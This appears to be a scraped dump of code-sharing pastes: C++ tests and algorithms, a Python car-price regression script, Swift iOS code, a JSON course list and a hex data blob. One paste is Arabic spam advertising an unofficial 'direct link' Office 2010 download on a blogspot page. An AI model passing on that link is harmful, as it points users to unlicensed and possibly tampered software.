datasets"", ""Exploring sample datasets with pacman"", ""Importing data from a spreadsheet"", ""Importing XML data"", ""Importing JSON data"", ""Saving data in native R formats""]}, {""section"": ""Visualizing Data with ggplot2"", ""titles"": [""Introduction to ggplot2"", ""Using colors in R"", ""Using color palettes"", ""Creating bar charts"", ""Creating histograms"", ""Creating box plots"", ""Creating scatterplots"", ""Creating multiple graphs"", ""Creating cluster charts""]}, {""section"": ""Wrangling Data"", ""titles"": [""Creating tidy data"", ""Using tibbles"", ""Using data.table"", ""Converting data from wide to tall and from tall to wide"", ""Converting data from tables to rows"", ""Working with dates and times"", ""Working with list data"", ""Working with XML data"", ""Working with categorical variables"", ""Filtering cases and subgroups""]}, {""section"": ""Recoding Data"", ""titles"": [""Recoding categorical data"", ""Recoding quantitative data"", ""Transforming outliers"", ""Creating scale scores by counting"", ""Creating scale scores by averaging""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps""]}]}, {""course_title"": ""Data Cleaning in Python Essential Training"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Miki Tebeka"", ""course_level"": ""Intermediate"", ""course_description"": ""If you\u2019re looking for more efficient ways to prepare your data for analysis, it\u2019s time to level up your skill set and reassess your approach to data cleaning. In this course, instructor Miki Tebeka shows you some of the most important features of productive data cleaning and acquisition, with practical coding examples using Python to test your skills. Learn about the organizational value of clean high-quality data, developing your ability to recognize common errors and quickly fix them as you go. Along the way, Miki offers cleaning strategies that can help optimize your workflow, including tips for causal analysis and easy-to-use tools for error prevention.This course is integrated with GitHub Codespaces, an instant cloud developer environment that offers all the functionality of your favorite IDE without the need for any local machine setup. With GitHub Codespaces, you can get hands-on practice from any machine, at any time\u2014all while using a tool that you\u2019ll likely encounter in the workplace. Check out the \u201cUsing GitHub Codespaces with this course\u201d video to learn how to get started."", ""course_skills"": [""Data Cleaning"", ""Python (Programming Language)""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Why is clean data important?"", ""What you should know"", ""Using GitHub Codespaces with this course""]}, {""section"": ""Bad Data"", ""titles"": [""Types of errors"", ""Missing values"", ""Bad values"", ""Duplicates""]}, {""section"": ""Causes of Errors"", ""titles"": [""Human errors"", ""Machine errors"", ""Design errors"", ""Challenge: UI design"", ""Solution: UI design""]}, {""section"": ""Detecting Errors"", ""titles"": [""Schemas"", ""Validation"", ""Finding missing data"", ""Domain knowledge"", ""Subgroups"", ""Challenge: Find bad data"", ""Solution: Find bad data""]}, {""section"": ""Preventing Errors"", ""titles"": [""Serialization formats"", ""Digital signature"", ""Data pipelines and automation"", ""Transactions"", ""Data organization and tidy data"", ""Process and data quality metrics"", ""Challenge: ETL"", ""Solution: ETL""]}, {""section"": ""Fixing Errors"", ""titles"": [""Renaming fields"", ""Fixing types"", ""Joining and splitting data"", ""Deleting bad data"", ""Filling missing values"", ""Reshaping data"", ""Challenge: Workshop earnings"", ""Solution: Workshop earnings""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps""]}]}]}"
ghdGHsq7,Дщcal&GlobalInclude,cepxuozab,C++,Saturday 8th of July 2023 06:51:25 AM CDT,"string GetFileContentsPraktikum(string file) {
        ifstream stream(file);
        return {(istreambuf_iterator<char>(stream)), istreambuf_iterator<char>()};
    }
void SimpleLocalInclude() {
        error_code err;
        filesystem::remove_all(""sources""_p, err);
        filesystem::create_directories(""sources""_p, err);
        {
            ofstream file(""sources/a.cpp"");
            file << ""// this comment before include\n""
                    ""#include \""b.h\""\n""
                    ""// text between b.h and c.h\n""
                    ""\n""
                    ""int SayHello() {\n""
                    ""    cout << \""hello, world!\"" << endl;\n""
                    ""}\n""sv;
        } {
            ofstream file(""sources/b.h"");
            file << ""// text from b.h before include\n""
                    ""// text from b.h after include""sv;
        }

        ASSERT((Preprocess(""sources""_p / ""a.cpp""_p, ""sources""_p / ""a.in""_p, {})));

        ostringstream test_out;
        test_out << ""// this comment before include\n""
                    ""// text from b.h before include\n""
                    ""// text from b.h after include\n""
                    ""// text between b.h and c.h\n""
                    ""\n""
                    ""int SayHello() {\n""
                    ""    cout << \""hello, world!\"" << endl;\n""
                    ""}\n""sv;

        ASSERT_EQUAL(GetFileContentsPraktikum(""sources/a.in""s), test_out.str());
    }
void SimpleGlobalInclude() {
        error_code err;
        filesystem::remove_all(""sources""_p, err);
        filesystem::create_directories(""sources""_p / ""include_dir""_p, err);
        {
            ofstream file(""sources/a.cpp"");
            file << ""// this comment before include\n""
                    ""#include <b.h>\n""
                    ""// text between b.h and c.h\n""
                    ""\n""
                    ""int SayHello() {\n""
                    ""    cout << \""hello, world!\"" << endl;\n""
                    ""}\n""sv;
        } {
            ofstream file(""sources/include_dir/b.h"");
            file << ""// text from b.h before include\n""
                    ""// text from b.h after include""sv;
        }

       ASSERT((Preprocess(""sources""_p / ""a.cpp""_p, ""sources""_p / ""a.in""_p,
                                     {""sources""_p / ""include_dir""_p})));

        ostringstream test_out;
        test_out << ""// this comment before include\n""
                    ""// text from b.h before include\n""
                    ""// text from b.h after include\n""
                    ""// text between b.h and c.h\n""
                    ""\n""
                    ""int SayHello() {\n""
                    ""    cout << \""hello, world!\"" << endl;\n""
                    ""}\n""sv;

       ASSERT_EQUAL(GetFileContentsPraktikum(""sources/a.in""s), test_out.str());
    }"
Y2i867ks,تحميل أوفيس 2010 برابط مباشر من ميديافاير وجوجل درايف,ghostman905,JavaScript,Saturday 8th of July 2023 06:43:17 AM CDT,"سنة 2006 مايكروسوفت بدأت العمل على الإصدار 14 من أوفيس وهي بتنهى العمل على الإصدار 12 ، وأطلقته سنة 2010 باسم أوفيس 2010 واللى لقى استحسان كبير من مستخدميه لإنهم لقوا فيه ميزات مكانتش موجودة فى الإصدارات الأقدم . 

https://worrdpro.blogspot.com/2022/04/Download-office-2010-direct-link.html"
paPhB1R1,Untitled,Josif_tepe,C++,Saturday 8th of July 2023 06:23:26 AM CDT,"class TreeAncestor {
public:
    int power_of_two;
  vector<vector<int>> upper_node;
  vector<int> depth_of_node;
    TreeAncestor(int n, vector<int>& parent) {
        power_of_two = 0;
        while((1 << power_of_two) <= n) {
            power_of_two++;
        }
        depth_of_node.resize(n + 1, 0);
        upper_node.resize(n);
        for(int i = 0; i < n; i++) {
            upper_node[i].resize(power_of_two + 1, 0);
        }
     
        parent[0] = 0;
        for(int i = 0; i < n; i++) {
            upper_node[i][0] = parent[i];
            if(i != 0) {
                depth_of_node[i] = depth_of_node[parent[i]] + 1;
            }
            
            for(int j = 1; j < power_of_two; j++) {
                upper_node[i][j] = upper_node[ upper_node[i][j - 1] ][j - 1];
            }
            
        }
        
    }
    
    int getKthAncestor(int node, int k) {
        if(depth_of_node[node] < k) {
            return -1;
        }
        int result = node;
        for(int i = 0; i < power_of_two; i++) {
            if(k & (1 << i)) {
                result = upper_node[result][i];
            }
        }
        return result;
    }
};"
rGwg2BSJ,Untitled,Eileanora,C++,Saturday 8th of July 2023 06:08:05 AM CDT,"#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>

#define Num_of_Digits(n) ((int)log10(n) + 1)
#define sz(x) int(x.size())
#define all(vec) vec.begin(), vec.end()
#define rall(vec) vec.rbegin(), vec.rend()
#define fixed(n) fixed << setprecision(n)
#define ll long long
#define ull unsigned long long
constexpr ll linf = 1LL << 62;
constexpr int inf = 1 << 30;
constexpr int mod = 1e9 + 7;
#define PI acos(-1)
#define cin_2d(vec, n, m) for(int i = 0; i < n; i++) for(int j = 0; j < m && cin >> vec[i][j]; j++);
#define ceil(w, m) (((w) / (m)) + ((w) % (m) ? 1 : 0)
#define PI acos(-1)
#define multiOrderedSet tree <int, null_type, less_equal<int>, rb_tree_tag,tree_order_statistics_node_update>
#define ordered_set tree<int, null_type,less<int>, rb_tree_tag,tree_order_statistics_node_update>

using namespace std;
using namespace __gnu_pbds;
template <typename T = int> istream &operator>>(istream &in, vector<T> &v)
{
    for (auto &x : v)
        in >> x;
    return in;
}
template <typename T = int> ostream &operator<<(ostream &out, const vector<T> &v)
{
    for (const T &x : v)
        out << x << "" "";
    return out;
}

void set_file(string &file_name) {
    freopen((file_name + "".in"").c_str(), ""r"", stdin);
    freopen((file_name + "".out"").c_str(), ""w"", stdout);
}

void btats()
{
    ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
    #ifndef ONLINE_JUDGE
        freopen(""/home/yasmeen/Documents/vs-folders/solving/misc/input.txt"", ""r"", stdin),
        freopen(""/home/yasmeen/Documents/vs-folders/solving/misc/output.txt"", ""w"", stdout);
    #endif
}

void solve()
{
    int a, b;
    cin >> a >> b;
    cout << (a + b == a * b? ""YES"" : ""NO"");
}

int main()
{
    // btats();
    int test = 1;
    //cin >> test;
    while(test--)
    {
        solve();
        cout << ""\n"";
    }
}"
YXsvWH0d,Untitled,Yuvraj9886,Python,Saturday 8th of July 2023 06:01:13 AM CDT,"import pandas as pd
import numpy as np
import seaborn as sns
from sklearn.model_selection import train_test_split
import matplotlib.pyplot as plt
from sklearn.impute import SimpleImputer
from sklearn.preprocessing import OneHotEncoder
from sklearn.preprocessing import OrdinalEncoder
from sklearn.compose import ColumnTransformer
from statsmodels.stats.outliers_influence import variance_inflation_factor
from sklearn.preprocessing import StandardScaler, RobustScaler, MinMaxScaler
from sklearn.feature_selection import RFE, f_regression
from sklearn.ensemble import RandomForestClassifier
from sklearn.pipeline import Pipeline
from sklearn.linear_model import LinearRegression, Ridge, Lasso
from sklearn.model_selection import GridSearchCV, KFold
from sklearn import utils
from mlxtend.feature_selection import SequentialFeatureSelector as SFS
from sklearn.model_selection import  cross_val_score
from sklearn.feature_selection import  SelectKBest
from sklearn.metrics import r2_score, mean_squared_error
from sklearn.tree import DecisionTreeRegressor
from sklearn.ensemble import RandomForestRegressor

# Display Pipeline

from sklearn import set_config
set_config(display='diagram')



df = pd.read_csv('CAR DETAILS FROM CAR DEKHO.csv')



#EDA and Preprocessing

# Displaying all columns
pd.set_option('display.max_columns', None)


# print(df.isnull().sum())
# print(df.dtypes)
# print(y.shape)
# print(df['transmission'].value_counts(), end='\n')
# print(df['fuel'].value_counts(), end='\n')
# print(df['seller_type'].value_counts(), end='\n')
# print(df['owner'].value_counts(), end='\n')
# print(df.duplicated(subset=None, keep='first'))

df = df.drop_duplicates()

df.drop('name', axis=1, inplace=True)



#Removing Time series column

df['years_old'] = 2020 - df.year
df.drop('year', axis=1, inplace=True)




#Removing Outliers(for selling price)

## for selling_price


percentile_25 = df['selling_price'].quantile(0.25)
percentile_75 = df['selling_price'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping
df['selling_price'] = np.where(
    df['selling_price'] > max,
    max,
    np.where(
        df['selling_price'] < min,
        min,
        df['selling_price']
    )
)


target = 'selling_price'

X = df.loc[:, df.columns != target]

y = df[target]


X_train , X_test, y_train , y_test  = train_test_split(X , y, test_size=0.3, random_state=42)

# print(X)



# i) Preprocessing-> Encoding

# Encoding Owner column-


X_train = X_train.replace(to_replace='First Owner', value=0)
X_train = X_train.replace(to_replace='Second Owner', value=1)
X_train = X_train.replace(to_replace='Third Owner', value=2)
X_train = X_train.replace(to_replace='Fourth & Above Owner', value=3)
X_train = X_train.replace(to_replace='Test Drive Car', value=0)

X_test = X_test.replace(to_replace='First Owner', value=0)
X_test = X_test.replace(to_replace='Second Owner', value=1)
X_test = X_test.replace(to_replace='Third Owner', value=2)
X_test = X_test.replace(to_replace='Fourth & Above Owner', value=3)
X_test = X_test.replace(to_replace='Test Drive Car', value=0)

trnf = ColumnTransformer(transformers=[
            ('trnf1', OrdinalEncoder(categories=[['Electric', 'LPG', 'CNG', 'Petrol', 'Diesel']]), ['fuel']),
            # ('trnf2', OrdinalEncoder(categories=[['Test Drive Car', 'Fourth & Above Owner', 'Third Owner', 'Second Owner', 'First Owner']]), ['owner']),
            ('trnf3', OrdinalEncoder(categories=[['Individual', 'Dealer', 'Trustmark Dealer']]), ['seller_type']),
            ('trnf4', OneHotEncoder(sparse_output=False), ['transmission'])
        ], remainder='passthrough')

X_train = pd.DataFrame(trnf.fit_transform(X_train), columns=trnf.get_feature_names_out())
X_test = pd.DataFrame(trnf.transform(X_test), columns=trnf.get_feature_names_out())



#Feature Scalling

scaler = StandardScaler()

# X_train_scaled = pd.DataFrame(scaler.fit_transform(X_train), columns=scaler.get_feature_names_out())
# X_test_scaled = pd.DataFrame(scaler.transform(X_test), columns=scaler.get_feature_names_out())

X_train = pd.DataFrame(scaler.fit_transform(X_train), columns=scaler.get_feature_names_out())
X_test = pd.DataFrame(scaler.transform(X_test), columns=scaler.get_feature_names_out())
# print(scaler.get_feature_names_out())





##Comparing Scalling Effect
# fig, (ax1, ax2) = plt.subplots(ncols=2, figsize=(12, 5))
#
#
# ax1.set_title('Before Scaling')
# sns.kdeplot(X_train['remainder__year'], ax=ax1)
# sns.kdeplot(X_train['remainder__km_driven'], ax=ax1)
#
# ax2.set_title('After Standard Scaling')
# sns.kdeplot(X_train_scaled['remainder__year'], ax=ax2)
# sns.kdeplot(X_train_scaled['remainder__km_driven'], ax=ax2)
# plt.show()



#Outlier Detection

##KDE Plot

# features = X_train.columns
# print(features)
# for col in features:
#     plt.figure(figsize=(16,5))
#     sns.distplot(X_train[col], kde=True)
#     plt.show()


##Using in-built function
# print(X_train[features].skew(), end='\n')



##Boxplot
# sns.boxplot(X_train)
# X_train.boxplot()
# plt.show()

#Correlation Matrix

### With independent features

# sns.set(font_scale = 1)
# plt.figure(figsize=(3,3))
# plt.xticks(rotation=45)
# cor = X_train.corr()
# sns.heatmap(cor, annot=True, cmap=""YlGnBu"", xticklabels=True, yticklabels=True, annot_kws={'fontsize': 8, 'fontweight': 'bold'})
# plt.show()


### With Dependent feature

# sns.set(font_scale = 1)
# plt.figure(figsize=(3,3))
# df_new = pd.concat([X_train, y_train], axis=1)
# cor = df_new.corr()
# sns.heatmap(cor, annot=True, cmap=""YlGnBu"", xticklabels=True, yticklabels=True, annot_kws={'fontsize': 8, 'fontweight': 'bold'})
# plt.xticks(rotation=45)
# plt.show()


#Removal of outliers(Using IQR method since skewed graph)

#IOR

###for km _driven

percentile_25 = X_train['remainder__km_driven'].quantile(0.25)
percentile_75 = X_train['remainder__km_driven'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping

X_train['remainder__km_driven'] = np.where(
    X_train['remainder__km_driven'] > max,
    max,
    np.where(
        X_train['remainder__km_driven'] < min,
        min,
        X_train['remainder__km_driven']
    )
)

# X_train = X_train[X_train['remainder__km_driven'] < max]
# X_train = X_train[X_train['remainder__km_driven'] > min]
# sns.boxplot(X_train)
# plt.show()


### for year


percentile_25 = X_train['remainder__years_old'].quantile(0.25)
percentile_75 = X_train['remainder__years_old'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping
X_train['remainder__years_old'] = np.where(
    X_train['remainder__years_old'] > max,
    max,
    np.where(
        X_train['remainder__years_old'] < min,
        min,
        X_train['remainder__years_old']
    )
)

# sns.boxplot(X_train)
# plt.show()



### for fuel


percentile_25 = X_train['trnf1__fuel'].quantile(0.25)
percentile_75 = X_train['trnf1__fuel'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping
X_train['trnf1__fuel'] = np.where(
    X_train['trnf1__fuel'] > max,
    max,
    np.where(
        X_train['trnf1__fuel'] < min,
        min,
        X_train['trnf1__fuel']
    )
)
# sns.boxplot(X_train)
# plt.show()



### for owner


percentile_25 = X_train['remainder__owner'].quantile(0.25)
percentile_75 = X_train['remainder__owner'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping
X_train['remainder__owner'] = np.where(
    X_train['remainder__owner'] > max,
    max,
    np.where(
        X_train['remainder__owner'] < min,
        min,
        X_train['remainder__owner']
    )
)
# X_train.boxplot()
# sns.boxplot(X_train)
# plt.show()


### for selley type


percentile_25 = X_train['trnf3__seller_type'].quantile(0.25)
percentile_75 = X_train['trnf3__seller_type'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping
X_train['trnf3__seller_type'] = np.where(
    X_train['trnf3__seller_type'] > max,
    max,
    np.where(
        X_train['trnf3__seller_type'] < min,
        min,
        X_train['trnf3__seller_type']
    )
)
# sns.boxplot(X_train)
# plt.show()


### for automatic


percentile_25 = X_train['trnf4__transmission_Automatic'].quantile(0.25)
percentile_75 = X_train['trnf4__transmission_Automatic'].quantile(0.75)
IQR = percentile_75-percentile_25

max = percentile_75 + 1.5*IQR
min = percentile_25 - 1.5*IQR


#Capping
X_train['trnf4__transmission_Automatic'] = np.where(
    X_train['trnf4__transmission_Automatic'] > max,
    max,
    np.where(
        X_train['trnf4__transmission_Automatic'] < min,
        min,
        X_train['trnf4__transmission_Automatic']
    )
)
# X_train.boxplot()
# sns.boxplot(X_train)
# plt.show()


### for Manual
'''
Helpul Outlier in prediction
'''




# ScatterPlot
# plt.scatter(X_train['remainder__km_driven'], y_train)
# plt.show()



#VIF

# vif_data = pd.DataFrame()
# vif_data[""features""] = X_train.columns
# vif_data[""VIF""] = [variance_inflation_factor(X_train.values, i)
#                    for i in range(len(X_train.columns))]

# print(vif_data)

""""""
Manual is more important than Automatic column
Dropping Automatic won't matter 
""""""

X_train.drop(columns='trnf4__transmission_Automatic' , axis=1, inplace=True)
X_test.drop(columns='trnf4__transmission_Automatic' , axis=1, inplace=True)

# X_train.drop(columns='trnf4__transmission_Manual' , axis=1, inplace=True)

# X_test.drop(columns='trnf4__transmission_Manual' , axis=1, inplace=True)


# X_train.reset_index(drop=True)
# X_test.reset_index(drop=True)
# y_train.reset_index(drop=True)
# y_test.reset_index(drop=True)



##Again Plotting


##Boxplot

# sns.boxplot(X_train)
# plt.show()

##Distplot
# features = X_train.columns
# print(features)
# for col in features:
#     plt.figure(figsize=(16,5))
#     sns.distplot(X_train[col], kde=True)
#     plt.show()



#Feature Selection

pipe = Pipeline([#('rfe', RFE(estimator=RandomForestClassifier(),step=1)),
                ('kbest', SelectKBest(k=5, score_func=f_regression)),
                ('lr', LinearRegression())])

#
# pipe = Pipeline([('sfs', SFS(estimator=RandomForestClassifier(), cv=5, n_jobs=-1)),
#                  ('lr', LinearRegression())])

grid = {
    # 'sfs__k_features': [int (i) for i in range(1, 7)],
    'kbest__k':[int (i) for i in range(1, 7)],
    # 'sfs__estimator__n_estimators': [int (i) for i in range (100, 1000, 100)]

}

##Hyper Parameter Tuning

# lr_gs = GridSearchCV(pipe, grid, cv=5, n_jobs=-1, verbose=2)
# lr_gs.fit(X_train, y_train)

# print('Best accuracy: ', lr_gs.best_score_, end='\n')
# print('Params: ', lr_gs.best_params_)

pipe.fit(X_train, y_train)



#Regression Metrics and Prediction



#Model-LInear Regression



#MSE (Overfitting or underfitting)

y_pred = pipe.predict(X_test)
pred_train = pipe.predict(X_train)
test = mean_squared_error(y_test, y_pred)
train = mean_squared_error(y_train, pred_train)
print(""--------------------------------------------------Linear Regession------------------------------------------------------"")
print(""MSE: "", ""Test: "", test, ""Train: "", train, end=""\n"")
print()


#Validation

kfold_validation = KFold(10)
results = cross_val_score(pipe, X_train, y_train, cv=kfold_validation)
print(""--------------------------------------------------Linear Regession------------------------------------------------------"")
print(""Results KFoldCrossValidation: "", results, end='\n')
acc = np.mean(results)
print()
print(""Accuracy KFoldCrossValidation: "", acc*100, end='\n')
print(""------------------------------------------------------------------------------------------------------------------------"")


#Plotting Graph b/w Predictied and Actual Values for LR

# plt.scatter(y_test, y_pred)
# plt.xlabel('True Quality')
# plt.ylabel('Predicted Quality')
# plt.title('Predicted Quality Against True Quality')
# plt.show()


# label = ""remainder__year""
# a = X_test[label]
# b = y_test
# c = X_test[label]
# d = y_pred
#
# plt.scatter(a,b)
# plt.scatter(c,d)
#
# plt.title(f""Age VS {label}: Test, Pred"",font= 'Times New Roman', fontsize = 16)
# plt.xlabel(""Age"", font= 'Times New Roman', fontsize = 14)
# plt.ylabel(""Selling_Price"", font= 'Times New Roman', fontsize = 14)
# plt.legend(handles = [plt.scatter(a,b, color='b'), plt.scatter(c,d, color='r')],
#            labels  = ['Test', 'Pred'])
# plt.grid()
#
# plt.show()




#Regularization


#Model-Ridge Regression

ridge = Ridge(alpha=10)
ridge.fit(X_train, y_train)



#MSE (Overfitting or underfitting)

y_pred_ridge = ridge.predict(X_test)

pred_train_ridge = ridge.predict(X_train)
test = mean_squared_error(y_test, y_pred_ridge)
train = mean_squared_error(y_train, pred_train_ridge)
print(""--------------------------------------------------Ridge Regession------------------------------------------------------"")
print(""MSE: "", ""Test: "", test, ""Train: "", train, end=""\n"")
print()

#Validation

kfold_validation = KFold(10)
results = cross_val_score(ridge, X_train, y_train, cv=kfold_validation)
print(""--------------------------------------------------Ridge Regression------------------------------------------------------"")
print(""Results KFoldCrossValidation: "", results, end='\n')
acc = np.mean(results)
print()
print(""Accuracy KFoldCrossValidation: "", acc*100, end='\n')
print(""------------------------------------------------------------------------------------------------------------------------"")




#Model-Decision Tree Regression

dt_reg = DecisionTreeRegressor()
dt_reg.fit(X_train, y_train)
y_pred_dt_reg = dt_reg.predict(X_test)

#Pruning

# path = dt_reg.cost_complexity_pruning_path(X_train, y_train)

# ccp_alpha, impurities = path.ccp_alphas, path.impurities

# print(ccp_alpha)


#Validation

kfold_validation = KFold(10)
results = cross_val_score(dt_reg, X_train, y_train, cv=kfold_validation)
print(""--------------------------------------------------Decision Tree Regession------------------------------------------------------"")
print(""Results KFoldCrossValidation: "", results, end='\n')
acc = np.mean(results)
print()
print(""Accuracy KFoldCrossValidation: "", acc*100, end='\n')
print(""------------------------------------------------------------------------------------------------------------------------"")















#Prection on Test Data

# y_pred = np.array(y_pred)
# y_test = np.array(y_test)
# for i in range(len(y_pred)):
#     print(""Actual: "", y_test[i])
#     print(""Prediction: "", y_pred[i], end='\n')
    # print(i)

"
zhKhLT6z,data627,TestGuy1,JSON,Saturday 8th of July 2023 06:00:11 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '21ab31ff59e168c7b7151d9384a15f41f9528cf89f6dee519b80611ab4569b606cb4b8577dc5c4bb5e73f9df347d36d1c7aad667f7482c7d3da48afad3d7c8847cd4faa63101438114a8835a9058de24d8cf24e3d3379bb96356d67676e3cfa6606adc0404b06059033e718dc0f0f878eefc96d891be5cc6aa1768e7be17c53c',
  otherdata: [
    '8bc190029eebd8c6477581f37dfb9e9f',
    '05b446d8ba431f30cd0eb0310e01b6c7',
    'c4d29c32b35ebdd93616a8ca9c29b2ed',
    '6beda4f12dda1a321232838ab80fe1c0',
    '22f4c5c7deda21c0ffe0d2b5f81177bb',
    '68b3d4d23f53984c196c934c2d1271c6',
    'c8239bd0a7717a253c92a2aa99191a13',
    'badc3ae3375476e0e1ca098ce7b53db9'
  ]
}"
M8KaSvpA,InteressiMeetUPVC,cristo1985,Swift,Saturday 8th of July 2023 05:38:08 AM CDT,"//
//  InteressiMeetUpVC.swift
//  Konnecta
//
//  Created by Cristian Capannini on 06/07/23.
//

import UIKit

protocol InteressiMeetUpVCDelegate: AnyObject { // class deprecated serve o non serve??!!
    func closingInteressiMeetUpVC()
}


class InteressiMeetUpVC: UIViewController {

    weak var delegate: InteressiMeetUpVCDelegate?
    
    @IBOutlet weak var aggiungiInteressiButton: UIButton!
    @IBOutlet weak var tableView: UITableView!
    
    let appDelegate = UIApplication.shared.delegate as! AppDelegate
    
    
    
    var checkboxData: [Bool] = []
    
    var feedbackArrayRec: [Interessi]?
 
    lazy var refreshControl: UIRefreshControl = {
        let refreshControl = UIRefreshControl()
        refreshControl.addTarget(self, action: #selector(ChatVC.handleRefresh(_:)), for: UIControl.Event.valueChanged)
        refreshControl.tintColor = UIColor.darkGray
        
        return refreshControl
    }()

    
    
    override func viewDidLoad() {
        super.viewDidLoad()

        /*tableView.tableFooterView = UIView(frame: .zero)
        tableView.register(UINib(nibName: ""InteresseCell2"", bundle: nil), forCellReuseIdentifier:  ""InteresseCell2"")
        tableView.estimatedRowHeight = 60.0
        tableView.dataSource = self
        tableView.delegate = self*/
        
        let object = getData()
        
        self.feedbackArrayRec = object?.interessi
        
        self.tableView?.register(UINib.init(nibName: ""TopTitleHeader"", bundle: nil), forHeaderFooterViewReuseIdentifier: ""TopTitleHeader"")
        self.tableView?.register(UINib.init(nibName: ""InteresseCell2"", bundle: nil), forCellReuseIdentifier: ""InteresseCell2"")
        
        self.tableView?.reloadData()
        
        //getData()
        
    }
    
    
    @IBAction func aggiungiInteressiButtonPressed(_ sender: Any) {
        
        /*var interessiSelezionati: [Interesse] = []
        for (index, item) in checkboxData.enumerated() {
            if item {
                print(""InteressiMeetUpVC aggiungiButtonPressed aggiungo l'interesse: \(self.allInteressiInSection[index].descrizione)"")
               
                interessiSelezionati.append(self.allInteressiInSection[index])
            }
        }
       
        if interessiSelezionati.count > 10 { // 8
            
            DispatchQueue.main.async {
                let alert = UIAlertController(title: """", message: ""E' possibile selezionare al massimo 10 interessi."", preferredStyle: .alert)
                
                let okAlert = UIAlertAction(title: ""Ok"", style: .default, handler: nil)
                //okAlert.setValue(accentColor, forKey: ""titleTextColor"")
                alert.addAction(okAlert)
                self.present(alert, animated: true)
            }
            
            
        } else {
            
            
            
        }
        */
       
        self.dismiss(animated: true, completion: nil)
    }
    
    

    
}

extension InteressiMeetUpVC:UITableViewDelegate{
    
    func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
        
        return 44.0
    }
    
    func tableView(_ tableView: UITableView, viewForHeaderInSection section: Int) -> UIView?{
        
        let headerView = tableView.dequeueReusableHeaderFooterView(withIdentifier: ""TopTitleHeader"") as? TopTitleHeader
        
        let contnetView = self.feedbackArrayRec?[section].categoria
        headerView?.setContent(content: contnetView)
        return  headerView
    }
    
    func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
        return 54.0
    }
    
    func tableView(_ tableView: UITableView, heightForFooterInSection section: Int) -> CGFloat {
        return .leastNonzeroMagnitude
    }
}


extension InteressiMeetUpVC: UITableViewDataSource{
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int{
        return self.feedbackArrayRec?[section].elenco.count ?? 0
    }
    
    func numberOfSections(in tableView: UITableView) -> Int {
        return self.feedbackArrayRec?.count ?? 0
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        
        let cell = tableView.dequeueReusableCell(withIdentifier: ""InteresseCell2"", for: indexPath) as! InteresseCell2
        
        let objectValue = self.feedbackArrayRec?[indexPath.section].elenco[indexPath.row]
        cell.setContentValue(contnet: objectValue)
        return cell
    }
}

func getData() -> EventsRecords?
{
    var tmpRec: EventsRecords?
    
    var dataAsString: String = String()
    
    print(""InteressiMeetUpVC getData"")
    
   /* DispatchQueue.main.async {
        self.refreshControl.endRefreshing()
    }
    */
    
    let getListaInteressiString = ""\(Constants.GET_LISTA_INTERESSI_URL)""
    let interessiURL: URL = URL(string: getListaInteressiString)!
     
    var request = URLRequest(url: interessiURL)
    request.httpMethod = ""POST""
    
    let headers = [""Content-Type"": ""application/x-www-form-urlencoded""]
    request.allHTTPHeaderFields = headers
    
    let parameters: [String: Any] = [
        ""user_id"": UserDefaults.standard.string(forKey: ""user_id"") ?? ""-1"",
        ""email"": UserDefaults.standard.string(forKey: ""email"") ?? ""utente@ospite.it"",
        ""r"": """" // mettere il campo search ma è
    ]
    
    request.httpBody = parameters.percentEncoded()
    
    let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
        guard let data = data else {
            print(""InteressiRegistrazioneVC getData error: \(String(describing: error))"")
            DispatchQueue.main.async {
                //self.hideLoading()
                //self.isLoading = false
            }
            return
        }
        
        if let httpResponse = response as? HTTPURLResponse {
            print(""InteressiMeetUpVC getData status code: \(httpResponse.statusCode)"")
            if httpResponse.statusCode == 200 {
                
            } else {
                
            }
        }
        
        // converting data to string
        
        dataAsString = String.init(data: data, encoding: String.Encoding.utf8)!
            print(""InteressiMeetUpVC getData dataAsString: \(dataAsString)"")
       
    
    
    //if let path = Bundle.main.path(forResource: dataAsString, ofType: ""json"")
    //{
        do {
            let jsonData = Data(dataAsString.utf8)
            let decoder = JSONDecoder()
            do {
                let people = try decoder.decode(EventsRecords.self, from: jsonData)
                tmpRec = people
            } catch {
                print(error)
            }
        }
        
   // }
        
    }
    task.resume()
    
    return tmpRec
}

struct EventsRecords: Codable {
    let success: Int?
    let interessi: [Interessi]?
}

// MARK: - Interessi
struct Interessi: Codable {
    let cid, categoria: String?
    let elenco: [Elenco]
}

// MARK: - Elenco
struct Elenco: Codable {
    let id, cid, descrizione: String?
}

"
s2ipysNW,Untitled,cepxuozab,C++,Saturday 8th of July 2023 05:31:45 AM CDT,"std::ostringstream out;
            RenderContext r(out, 1, 3);
            ASSERT_EQUAL(&r.out, &out);
            ASSERT_EQUAL(r.indent_step, 1);
            ASSERT_EQUAL(r.indent, 3);
            r.RenderIndent();
            ASSERT_EQUAL(out.str(), ""   "");

            auto r_i = r.Indented();
            ASSERT_EQUAL(&r_i.out, &out);
            ASSERT_EQUAL(r_i.indent_step, 1);
            ASSERT_EQUAL(r_i.indent, 4);
            r_i.RenderIndent();
            ASSERT_EQUAL(out.str(), ""       "");"
